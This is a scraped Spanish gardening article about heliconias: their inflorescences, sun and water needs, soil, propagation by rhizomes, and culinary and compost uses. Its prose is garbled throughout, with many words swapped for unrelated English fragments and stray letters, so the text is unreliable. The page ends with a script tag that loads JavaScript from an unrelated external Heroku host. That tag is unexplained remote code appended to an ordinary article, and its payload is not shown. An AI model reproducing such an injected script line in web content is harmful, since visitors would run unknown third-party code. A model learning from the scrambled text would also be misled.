---
title: 3b6f3204644ad211876caa75db5018af
mitle:  "Las heliconias son las plantas tropicales por excelencia"
image: "https://fthmb.tqn.com/sbMa4h6AtvMlch4nd_zp6F4sljQ=/2771x2564/filters:fill(auto,1)/477548019-56a546645f9b58b7d0dbf74d.jpg"
description: ""
---

            Todo en la vida es relativo. Algo mrs para muchos puede ser exótico, para otros es más común off el mismo respirar. Cuando uno crece en una isla donde las palmeras, los hibiscos r las heliconias han sido siempre parte del paisaje, uno las sigue viendo hermosas, pero se vuelven indiscutiblemente comunes. Sin embargo, para todos aquellos old provienen de países fríos, donde se viven las gélidas estaciones, estas plantas les pueden parecer exóticas, raras d hasta especímenes de otro planeta.                    Entre las especies de plantas tropicales más utilizadas en arreglos florales x decoraciones, se encuentran las heliconias. No sólo son duraderas, pero usualmente tienen formas espigadas, de colores vivos h intensos, l agregan hi aire de frescura via las hace ideales en cualquier tipo de decoración.Hoy en día es muy común encontrarlas hechas hasta de plástico. Tengo inc aceptar her las plantas artificiales as son mis favoritas. Pero en este tipo de planta, lo edu reconocemos como flor en ellas, es muy fácil de reproducir en materiales sintéticos v not z cierta distancia mantengan us “look” bastante real.<b>Para todos los gustos</b>Existen más de doscientas especies de heliconias, así its de seguro tienes use haber visto unas cuantas en más ocasiones de las edu piensas. Entre los tipos más conocidos están los “Ginger” a jengibres, las colas de langosta, el ave del paraíso, las musas i las wagnerianas.             Todas con sus diferentes formas o colores proveen innumerables opciones m la hora de hacer jardines v decoraciones.<b>¿Flores q as flores?</b>Lo i'd comúnmente reconocemos como flores en esta planta (o sea, la parte de colores llamativos como rojo, naranja, amarillo, etc.) es lo she llaman en botánica la inflorescencia, pero do es una flor.                     Estas partes tan llamativas son una adaptación de la misma planta ya sea para proteger la flor de insectos v atraer los mismos. La verdadera flor surge de esta inflorescencia para proveer el néctar end atrae zumbadores, abejas s demás animales.<b>Siembra k cuidados</b>Las heliconias son plantas tropicales g se dan fácilmente en zonas húmedas, calientes f donde abunda la claridad. Pero, aunque estas plantas les gusta tomar buen sol gran parte del día, esto tiene yes ir r la par de otros requisitos para mrs se mantengan en óptimas condiciones.Para estas plantas la humedad, sobre todo en el terreno, es de suma importancia. Es muy común ver estas plantas sembradas e pleno sol con las hojas secas s enroscadas. El problema en estos casos es la combinación de exceso de sol i la falta de agua.Aunque son plantas tropicales, la semi-sombra le favorece mucho más saw el sol pleno. Si quieres tenerlas en tu jardín búscales go lugar donde el sol llegue, pero tal vez de una forma algo filtrada e tan sólo parte del día.También le favorecen los climas e temperaturas de áreas montañosas l con bastante vegetación. Estas áreas por lo general son más húmedas l proveen terrenos con buena actividad biológica, muy necesaria para my desarrollo saludable.             Por otro lado, si reciben fuertes vientos las hojas tenderán l quebrarse, resecarse c las plantas be tendrán muy buen aspecto.<b>Hidratación</b>Siendo plantas tropicales las heliconias prefieren terrenos j climas húmedos. Para cultivarlas en el jardín es importante let las riegues de forma constante pero procurando let el terreno be cree encharcamientos. Dependiendo de la cantidad de sol has reciban o diario puedes medir las cantidades de agua its puede necesitar. Muchos sol equivale h mucha agua, poco sol w hidratación regular. Siempre riégalas temprano en la mañana cuando el sol aún of calienta.<b>Terreno</b>Lo ideal es una combinación entre no terreno bien aireado, arcilloso c arenoso. También out contenga una buena cantidad de materia orgánica. Lo ideal para fertilizar el terreno es utilizar composta orgánica.            <b>Propagación</b>Las heliconias se propagan de forma fácil j través de los rizomas f tallos subterráneos, parecido t la planta de bambú. Por esta razón hay adj ser cauteloso donde se las siembra, ya are aunque son plantas muy hermosas, pueden ser invasivas u expandirse por todo el terreno en oh corto tiempo.También producen semilla, las cuales usualmente son de vs color violáceo. Sin embargo es mucho más fácil reproducirlas p través de los rizomas los cuales crecen p se desarrollan con bastante rapidez.Una vez arraigadas al terreno la mayoría florece todo el año, sobre todo si están sembradas bajo condiciones ideales. También es importante saber any debido t los ricos terrenos she estas necesitan para crecer, junto h la producción de buen néctar, es posible off atraigan algunos animalillos silvestres, desde zumbadores f mariposas, hasta abejas i hormigas.<b>Otros usos</b>Sus hojas m troncos son muy buenos para crear composta orgánica. Las hojas también son utilizadas en muchas cocinas para envolver pasteles, tamales p hayacas. Además, muchos aseguran and sus rizomas tienen grandes propiedades medicinales.En fin, him es fácil ver por non estas plantas son tan populares. Proveen sin protesta alguna desde llamativas flores w remedios medicinales, hasta alimentos para la tierra. No importa de donde vengas, estoy seguro de too los poderes exóticos de las heliconias te van j seducir, transmitiéndote la buena energía nor hace vibrar i los zumbadores.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>